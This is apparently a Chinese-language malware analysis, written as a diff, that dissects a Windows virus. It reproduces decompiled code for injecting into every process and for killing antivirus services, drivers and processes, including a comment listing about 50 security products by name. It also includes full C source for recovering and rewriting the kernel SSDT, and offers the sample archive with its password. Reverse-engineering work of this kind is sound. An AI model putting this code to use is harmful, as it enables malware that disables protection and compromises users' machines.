+ char v13; // [sp+23Fh] [bp-1h]@1
+
+ v9 = 0;
+
+ String = 0;
+
+ memset(v11, 0, sizeof(v11));
+
+ v12 = 0;
+
+ v13 = 0;
+
+ hSnapshot = CreateToolhelp32Snapshot(2u, 0);
+
+ if ( hSnapshot )
+
+ {
+
+  pe.dwSize = 296;
+
+  memset(&pe.cntUsage, 0, 0x124u);
+
+  if ( Process32First(hSnapshot, &pe) )
+
+  {
+
+   if ( pe.th32ProcessID > 10 )
+
+   {
+
+    if ( lstrlenA(pe.szExeFile) <= 64 )
+
+     lstrcpyA(&String, pe.szExeFile);
+
+    else
+
+     lstrcpynA(&String, pe.szExeFile, 64);
+
+    CharLowerA(&String);
+
+    pid = pe.th32ProcessID;
+
+    v1 = lstrlenA(&String);
+
+    wsprintfA(&String + v1, "M_%d_", pid);
+
+    v2 = CreateMutexA(0, 0, &String);
+
+    v9 = GetLastError();
+
+    ReleaseMutex(v2);
+
+    CloseHandle(v2);
+
+    if ( !v9 )
+
+     injectModuleProcces(pe.th32ProcessID, pe.th32ProcessID, &String);
+
+   }
+
+  }
+
+  while ( Process32Next(hSnapshot, &pe) )
+
+  {
+
+   if ( pe.th32ProcessID > 0xA )
+
+   {
+
+    if ( lstrlenA(pe.szExeFile) <= 64 )
+
+     lstrcpyA(&String, pe.szExeFile);
+
+    else
+
+     lstrcpynA(&String, pe.szExeFile, 64);
+
+    CharLowerA(&String);
+
+    v3 = pe.th32ProcessID;
+
+    v4 = lstrlenA(&String);
+
+    wsprintfA(&String + v4, "M_%d_", v3);
+
+    v5 = CreateMutexA(0, 0, &String);
+
+    v9 = GetLastError();
+
+    ReleaseMutex(v5);
+
+    CloseHandle(v5);
+
+    if ( !v9 )                    // 未被注入过 就一个个注入
+
+     injectModuleProcces((int)&String, pe.th32ProcessID, &String);
+
+   }
+
+  }
+
+ }
+
+ return CloseHandle(hSnapshot);
+
+}
+
+if ( !lstrcmpiA(&String1, "system")
+
+ || !lstrcmpiA(&String1, "local service")
+
+ || !lstrcmpiA(&String1, "network service") )
+
+ {
+
+  CreateMutexA(0, 0, lpString);
+
+  v47 = -1;
+
+  goto LABEL_50;
+
+ }
+
+ v8 = VirtualAllocEx(hProcess, 0, 0x2000u, 0x3000u, 0x40u);
+
+ lpStartAddress = v8;
+
+ if ( v8 )
+
+ {
+
+  if ( !WriteProcessMemory(hProcess, lpStartAddress, &codepuryFileBuffer, 0x2000u, &NumberOfBytesWritten) )// 远程注入刚才生成好的地址模块
+```
+
+### 3. `FuckSaftySoftInR0AndR3`
+
+关于杀毒安全软件，其采取先关服务和关闭驱动，然后关已启动的进程
+
+```
+{
+
+ LoadiPfltDrvFunc();
+
+ v1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)FuckTheSecuritySoftAndDelete, 0, 0, &ThreadId);
+
+ WaitObject(v1, 0, 0);
+
+ hModuleNtdll = LoadLibraryA(strNtdll);
+
+ if ( hModuleNtdll )
+
+ {
+
+  adrNtQuerySystemInformation = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModuleNtdll, stNtQuerySystemInformation);
+
+  if ( adrNtQuerySystemInformation )
+
+  {
+
+   if ( !ifAmsint32Exist() )
+
+   {
+
+    ReSizeAndGenericPEfile(byte_4A82D8, off_40167C, 0x1425u);
+
+    sub_429243(off_4016B0, byte_4A82D8);
+
+   }
+
+   if ( ifAmsint32Exist() )
+
+   {
+
+    if ( getSSDTENtryBak() )
+
+    {
+
+     v2 = CreateThread(
+
+      0,
+
+      0,
+```
+
+
+
+```c
+(LPTHREAD_START_ROUTINE)ThreadProc2_1FuckAndProctect,  
+0,  
+0,  
+&ThreadId);  
+WaitObject(v2, 0, 0);  
+
+void __userpurge FuckTheSecuritySoftAndDelete(int a1<eax>, int a2//驱动关闭删除  
+
+{  
+  char v2; // [sp-Ch] [bp-2Ch]@1  
+  unsigned int v3; // [sp+0h] [bp-20h]@1  
+  int v4; // [sp+4h] [bp-1Ch]@1  
+  char *v5; // [sp+8h] [bp-18h]@1  
+  int v6; // [sp+10h] [bp-10h]@1  
+  int (*v7)(); // [sp+14h] [bp-Ch]@1  
+  int v8; // [sp+18h] [bp-8h]@1  
+  int v9; // [sp+1Ch] [bp-4h]@1  
+  v8 = (int)dword_423FC8;  
+  v7 = except_handler3;  
+  v6 = a1;  
+  v5 = &v2;  
+  v9 = 0;  
+  v3 = 0;  
+  v4 = adrOpenSCManager(0, 0, 983103);  
+  while ( 1 )  
+  {  
+    Sleep(0x1000u);  
+    v3 = 0;  
+    while ( v3 < 0x96 && lstrlenA((&lpString)[4 * v3]) > 0 )  
+    {  
+      CloseSeritySoftAndDeleteit(v4, (&lpString)[4 * v3++], 1);  
+      Sleep(0x80u);                 // 循环去关闭杀毒软件的服务 和删除相应的驱动 看 lpstring：  
+                                    // t:004018E0                         ; sub_42940A+9A_r  
+                                    // .text:004018E0                         ; "AVP"  
+                                    // .text:004018E4 F0 28 42 00      dd offset aAgnitumClientS     ; "Agnitum Client Security Service"  
+                                    // .text:004018E8 10 29 42 00      dd offset off_422910  
+                                    // .text:004018EC 14 29 42 00      dd offset dword_422914  
+                                    // .text:004018F0 24 29 42 00      dd offset aAswupdsv           ; "aswUpdSv"  
+                                    // .text:004018F4 30 29 42 00      dd offset aAswmon2            ; "aswMon2"  
+                                    // .text:004018F8 38 29 42 00      dd offset aAswrdr             ; "aswRdr"  
+                                    // .text:004018FC 40 29 42 00      dd offset aAswsp              ; "aswSP"  
+                                    // .text:00401900 48 29 42 00      dd offset aAswtdi             ; "aswTdi"  
+                                    // .text:00401904 50 29 42 00      dd offset aAswfsblk           ; "aswFsBlk"  
+                                    // .text:00401908 5C 29 42 00      dd offset aAcssrv             ; "acssrv"  
+                                    // .text:0040190C 64 29 42 00      dd offset aAvEngine           ; "AV Engine"  
+                                    // .text:00401910 70 29 42 00      dd offset aAvastIavs4Cont     ; "avast! iAVS4 Control Service"  
+                                    // .text:00401914 90 29 42 00      dd offset aAvastAntivirus     ; "avast! Antivirus"  
+                                    // .text:00401918 A4 29 42 00      dd offset aAvastMailScann     ; "avast! Mail Scanner"  
+                                    // .text:0040191C B8 29 42 00      dd offset aAvastWebScanne     ; "avast! Web Scanner"  
+                                    // .text:00401920 CC 29 42 00      dd offset aAvastAsynchron     ; "avast! Asynchronous Virus Monitor"  
+                                    // .text:00401924 F0 29 42 00      dd offset aAvastSelfProte     ; "avast! Self Protection"  
+                                    // .text:00401928 08 2A 42 00      dd offset aAvgEMailScanne     ; "AVG E-mail Scanner"  
+                                    // .text:0040192C 1C 2A 42 00      dd offset aAviraAntivirPr     ; "Avira AntiVir Premium Guard"  
+                                    // .text:00401930 38 2A 42 00      dd offset aAviraAntivir_0     ; "Avira AntiVir Premium WebGuard"  
+                                    // .text:00401934 58 2A 42 00      dd offset aAviraAntivir_1     ; "Avira AntiVir Premium MailGuard"  
+                                    // .text:00401938 78 2A 42 00      dd offset aBglivesvc          ; "BGLiveSvc"  
+                                    // .text:0040193C 84 2A 42 00      dd offset aBlackice           ; "BlackICE"  
+                                    // .text:00401940 90 2A 42 00      dd offset aCaisafe            ; "CAISafe"  
+                                    // .text:00401944 98 2A 42 00      dd offset aCcevtmgr           ; "ccEvtMgr"  
+                                    // .text:00401948 A4 2A 42 00      dd offset aCcproxy            ; "ccProxy"  
+                                    // .text:0040194C AC 2A 42 00      dd offset aCcsetmgr           ; "ccSetMgr"  
+                                    // .text:00401950 B8 2A 42 00      dd offset aComodoFirewall     ; "COMODO Firewall Pro Sandbox Driver"  
+                                    // .text:00401954 DC 2A 42 00      dd offset aCmdguard           ; "cmdGuard"  
+                                    // .text:00401958 E8 2A 42 00      dd offset aCmdagent           ; "cmdAgent"  
+                                    // .text:0040195C F4 2A 42 00      dd offset aEsetService        ; "Eset Service"  
+                                    // .text:00401960 04 2B 42 00      dd offset aEsetHttpServer     ; "Eset HTTP Server"  
+                                    // .text:00401964 18 2B 42 00      dd offset aEsetPersonalFi     ; "Eset Personal Firewall"  
+                                    // .text:00401968 30 2B 42 00      dd offset aFProtAntivirus     ; "F-Prot Antivirus Update Monitor"  
+                                    // .text:0040196C 50 2B 42 00      dd offset aFsbwsys            ; "fsbwsys"  
+                                    // .text:00401970 58 2B 42 00      dd offset aFsdfwd             ; "FSDFWD"  
+                                    // .text:00401974 60 2B 42 00      dd offset aFSecureGatekee     ; "F-Secure Gatekeeper Handler Starter"  
+                                    // .text:00401978 84 2B 42 00      dd offset aFsma               ; "FSMA"  
+                                    // .text:0040197C 8C 2B 42 00      dd offset aGoogleOnlineSe     ; "Google Online Services"  
+                                    // .text:00401980 A4 2B 42 00      dd offset aInorpc             ; "InoRPC"  
+                                    // .text:00401984 AC 2B 42 00      dd offset aInort              ; "InoRT"  
+                                    // .text:00401988 B4 2B 42 00      dd offset aInotask            ; "InoTask"  
+                                    // .text:0040198C BC 2B 42 00      dd offset aIssvc              ; "ISSVC"  
+                                    // .text:00401990 C4 2B 42 00      dd offset aKpf4               ; "KPF4"  
+                                    // .text:00401994 CC 2B 42 00      dd offset aKlif               ; "KLIF"  
+                                    // .text:00401998 D4 2B 42 00      dd offset aLavasoftfirewa     ; "LavasoftFirewall"  
+                                    // .text:0040199C E8 2B 42 00      dd offset aLivesrv            ; "LIVESRV"  
+                                    // .text:004019A0 F0 2B 42 00      dd offset aMcafeeframewor  
+    }  
+    Sleep(0x2D000u);  
+  }  
+}  
+
+BOOL __cdecl ContinuFuckAndProctect() 关掉进程  
+{
+```
+
+
+
+`PROCESSENTRY32 pe;` // `[sp+4h] [bp-23Ch]@2`
+
+`DWORD v2;` // `[sp+12Ch] [bp-114h]@1`
+
+`HANDLE hObject;` // `[sp+130h] [bp-110h]@1`
+
+`int i;` // `[sp+134h] [bp-10Ch]@1`
+
+`int v5;` // `[sp+138h] [bp-108h]@1`
+
+`char v6;` // `[sp+13Ch] [bp-104h]@1`
+
+`char v7;` // `[sp+13Dh] [bp-103h]@1`
+
+`__int16 v8;` // `[sp+23Dh] [bp-3h]@1`
+
+`char v9;` // `[sp+23Fh] [bp-1h]@1`
+
+`i = 0;`
+
+`v5 = 0;`
+
+`v2 = 0;`
+
+`v6 = 0;`
+
+`memset(&v7, 0, 0x100u);`
+
+`v8 = 0;`
+
+`v9 = 0;`
+
+`hObject = CreateToolhelp32Snapshot(2u, 0);`
+
+`if ( hObject )`
+`{`
+  `memset(&pe.cntUsage, 0, 0x124u);`
+  `pe.dwSize = 296;`
+  `if ( Process32First(hObject, &pe) )`
+  `{`
+    `CharUpperA(pe.szExeFile);`
+    `for ( i = 0; *strSafeSoft[i]; ++i )`
+    `{`
+      `if ( compareString(pe.szExeFile, strSafeSoft[i]) )`
+      `{`
+        `terminateSoftyProccess(pe.th32ProcessID);`
+        `v2 = pe.th32ProcessID;`
+        `Sleep(0x400u);`
+        `break;`
+      `}`
+    `}`
+    `if ( pe.th32ProcessID != v2 )` // 保护自己的进程
+    `{`
+      `if ( FindDWEBIO(pe.th32ProcessID) )`
+      `{`
+        `terminateSoftyProccess(pe.th32ProcessID);`
+        `v2 = pe.th32ProcessID;`
+        `Sleep(0x400u);`
+      `}`
+    `}`
+  `}`
+
+`LABEL_11:`
+`while ( Process32Next(hObject, &pe) )`
+`{`
+  `CharUpperA(pe.szExeFile);`
+  `if ( pe.th32ProcessID != v2 )`
+  `{`
+    `if ( FindDWEBIO(pe.th32ProcessID) )`
+    `{`
+      `terminateSoftyProccess(pe.th32ProcessID);`
+      `v2 = pe.th32ProcessID;`
+      `Sleep(0x400u);`
+    `}`
+    `else`
+    `{`
+      `for ( i = 0; *strSafeSoft[i]; ++i )`
+      `{`
+        `if ( compareString(pe.szExeFile, strSafeSoft[i]) )`
+        `{`
+          `terminateSoftyProccess(pe.th32ProcessID);`
+          `v2 = pe.th32ProcessID;`
+          `Sleep(0x400u);`
+          `goto LABEL_11;`
+        `}`
+      `}`
+    `}`
+  `}`
+`}`
+
+```c
+ps:在对杀软处理时，基本采取 开辟 两线程 死循环 运行 r0 r3 结合 ，如果 r3 层关不掉 交给 病毒挂在的驱动继续 记住 pid 关闭看这里
+WriteFile(v3, &Buffer, 4u, &NumberOfBytesWritten, 0);// 如果没有成功内核来搞定，记录 pid
+result = (void *)CloseHandle(v3);
+```
+
+大家也可以看看 `getSSDTENtryBak()` 这个函数 可能作者也是抄袭的 ，哎~~~~
+
+他是想通过 `r3` 层获取 `ssdt` 表 ，对内核 直接修改，当自己驱动挂载上去，就是一份 修改后的表，达到 `hook` 的目的 ，下面是我找到的源码 ，其实 很有意思，但我基本 已经恢复了 ，顺便提一下 ，如果是 `ida` 搞清楚 `pe` 结构后 ，记住一定要用结构体 对 反编译的代码 进行还原，这样，代码会很容易恢复出来
+
+### 获取 `KeSSdt` 源码
+
+`ps:这个病毒编写者很懒`
+
+```c
+void ReSSDT( IN HANDLE hDriver)    
+{    
+    HMODULE    hKernel;    
+    DWORD    dwKSDT;             // rva of KeServiceDescriptorTable     
+    DWORD    dwKiServiceTable;    // rva of KiServiceTable     
+    PMODULES    pModules=(PMODULES)&pModules;    
+    DWORD    dwNeededSize,rc;    
+    DWORD    dwKernelBase,dwServices=0;    
+    PCHAR    pKernelName;    
+    PDWORD    pService;    
+    PIMAGE_FILE_HEADER    pfh;    
+    PIMAGE_OPTIONAL_HEADER    poh;    
+    PIMAGE_SECTION_HEADER    psh;    
+    FARPROC NtQuerySystemInformationAddr=GetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");    
+    // get system modules - ntoskrnl is always first there,   
+    rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,4,&dwNeededSize);    
+             if (rc==STATUS_INFO_LENGTH_MISMATCH)       {    
+        pModules=(MODULES *)GlobalAlloc(GPTR,dwNeededSize);     
+             rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,dwNeededSize,NULL);    
+    }  
+    else  
+    {    
+      strange:    
+        printf("strange NtQuerySystemInformation()!\n");    
+        return;    
+    }    
+    if (!NT_SUCCESS(rc)) goto strange;   //不成功则退出
+    // imagebase     
+    dwKernelBase=(DWORD)pModules->smi.Base;        
+    // filename - it may be renamed in the boot.ini     
+    pKernelName=pModules->smi.ModuleNameOffset+pModules->smi.ImageName;         
+    // map ntoskrnl - hopefully it has relocs     
+    hKernel=LoadLibraryEx(pKernelName,0,DONT_RESOLVE_DLL_REFERENCES);    //加载模块
+    if (!hKernel) {    
+        printf("Failed to load! LastError=%i\n",GetLastError());    
+        return;           
+    }    
+    GlobalFree(pModules);    //释放空间
+    // our own export walker is useless here - we have GetProcAddress :)         
+    if (!(dwKSDT=(DWORD)GetProcAddress(hKernel,"KeServiceDescriptorTable")))  
+  {   //试图获取模块中的 ssdt 表基址,这里已经获取了地址
+        printf("Can't find KeServiceDescriptorTable\n");    
+        return;    
+    }    
+    // get KeServiceDescriptorTable rva     
+    dwKSDT-=(DWORD)hKernel;      // find KiServiceTable     
+    if (!(dwKiServiceTable=FindKiServiceTable(hKernel,dwKSDT)))  
+  {   //在模块中寻找 ssdt 表偏移地址为啥这里又去寻找 ssdt 表的地址了？
+        printf("Can't find KiServiceTable...\n");    
+        return;    
+    }    
+    printf("&KiServiceTable==%08X\n\nDumping 'old' ServiceTable:\n\n",dwKiServiceTable+dwKernelBase);        
+    // let's dump KiServiceTable contents           
+    // MAY FAIL!!!     
+    // should get right ServiceLimit here, but this is trivial in the kernel mode     
+    GetHeaders((PCHAR)hKernel,&pfh,&poh,&psh);        //获取文件头信息
+    for (pService=(PDWORD)((DWORD)hKernel+dwKiServiceTable);   //基址+偏移
+            *pService-poh->ImageBase<poh->SizeOfImage;    
+            pService++,dwServices++)    
+    {    
+        ULONG ulAddr=*pService-poh->ImageBase+dwKernelBase;   //kernel 库文件中服务绝对地址-文件的基址+kernel 库文件的基址=相当于 kernel 文件基址的绝对地址
+        SetProc( hDriver,dwServices, &ulAddr );               //通过驱动命令修改函数地址
+        //printf("%08X\n",ulAddr);         
+    }    
+    printf("\n\nPossibly KiServiceLimit==%08X\n",dwServices);    
+    FreeLibrary(hKernel);    
+}    
+DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)  //模块句柄，SSTD 表偏移地址   
+{    
+    PIMAGE_FILE_HEADER    pfh;    
+    PIMAGE_OPTIONAL_HEADER    poh;    
+    PIMAGE_SECTION_HEADER    psh;    
+    PIMAGE_BASE_RELOCATION    pbr;    
+    PIMAGE_FIXUP_ENTRY    pfe;        
+    DWORD    dwFixups=0,i,dwPointerRva,dwPointsToRva,dwKiServiceTable;    
+    BOOL    bFirstChunk;    
+    GetHeaders((PCHAR)hModule,&pfh,&poh,&psh);    
+  //获取模块 dll 的文件头信息,返回数据目录的绝对地址到 psh,poh 为文件头绝对地址，pfh 为 pe 标志绝对地址
+    // loop thru relocs to speed up the search     
+    if ((poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&    
+        (!((pfh->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED)))
+  {   
+        pbr=(PIMAGE_BASE_RELOCATION)RVATOVA(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);    
+               bFirstChunk=TRUE;    
+        // 1st IMAGE_BASE_RELOCATION.VirtualAddress of ntoskrnl is 0     
+        while (bFirstChunk || pbr->VirtualAddress) {   //
+            bFirstChunk=FALSE;    
+            pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));    
+这里 pfe 已经指向 IMAGE_BASE_RELOCATION 结构之后的另一个区段了？
+            for (i=0;i<(pbr->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))>>1;i++,pfe++) {    
+                if (pfe->type==IMAGE_REL_BASED_HIGHLOW)  
+          {   这里怎么能取本区段 IMAGE_BASE_RELOCATION 结构内的 typeoffset 里的类型？,下一个区段的？又不像
+                    dwFixups++;    
+                    dwPointerRva=pbr->VirtualAddress+pfe->offset;    
+                    // DONT_RESOLVE_DLL_REFERENCES flag means relocs aren't fixed     
+                    dwPointsToRva=*(PDWORD)((DWORD)hModule+dwPointerRva)-(DWORD)poh->ImageBase;    
+                    // does this reloc point to KeServiceDescriptorTable.Base?     
+                    if (dwPointsToRva==dwKSDT) {    
+                        // check for mov [mem32],imm32. we are trying to find     
+                        // "mov ds:_KeServiceDescriptorTable.Base, offset _KiServiceTable"     
+```
+
+
+
+```
+// from the KiInitSystem.
+
+if (*(PWORD)((DWORD)hModule+dwPointerRva-2)==0x05c7) {
+
+    // should check for a reloc presence on KiServiceTable here
+
+    // but forget it
+
+    dwKiServiceTable=*(PDWORD)((DWORD)hModule+dwPointerRva+4)-poh->ImageBase;
+
+    return dwKiServiceTable;
+
+}
+}
+} else
+    if (pfe->type!=IMAGE_REL_BASED_ABSOLUTE)
+
+        // should never get here
+
+        printf("\trelo type %d found at .%X\n",pfe->type,pbr->VirtualAddress+pfe->offset);
+}
+*(PDWORD)&pbr+=pbr->SizeOfBlock;
+
+}
+
+}
+
+if (!dwFixups)
+
+    // should never happen - nt, 2k, xp kernels have relocation data
+
+    printf("No fixups!\n");
+
+return 0;
+}
+```
+
+下面几个线程基本就是感染和连接外网通信，我觉得我注释的有点详细了，可能会忽略一些细节，手段很常规，比如全盘感染还是开辟线程扫盘，进行`pe`改写然后执行进程。
+
+笔记以及脱壳以及`主文件.rar`
+
+执行体密码：`virus`
